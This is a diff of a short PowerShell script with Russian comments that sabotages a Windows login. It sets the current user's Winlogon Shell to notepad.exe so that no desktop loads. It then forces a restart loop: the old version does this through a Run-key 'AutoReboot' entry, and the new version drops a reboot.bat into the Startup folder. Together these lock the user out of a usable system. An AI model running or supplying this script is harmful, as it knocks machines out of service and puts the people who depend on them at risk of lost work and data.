@@ -1,6 +1,7 @@
-# Очищаем Shell - после входа в систему не будет рабочего стола
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "notepad.exe"
+# Заменяем оболочку на notepad.exe
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "notepad.exe"
 
-# Добавляем автозапуск на мгновенный ребут
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoReboot" -Value "shutdown /r /t 0"
-shutdown /r /t 0
+# Создаем BAT в автозагрузке для автоматического ребута
+$batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reboot.bat"
+$batContent = "@echo off`r`ntimeout /t 3 >nul`r`nshutdown /r /t 0"
+Set-Content -Path $batPath -Value $batContent -Encoding ASCII
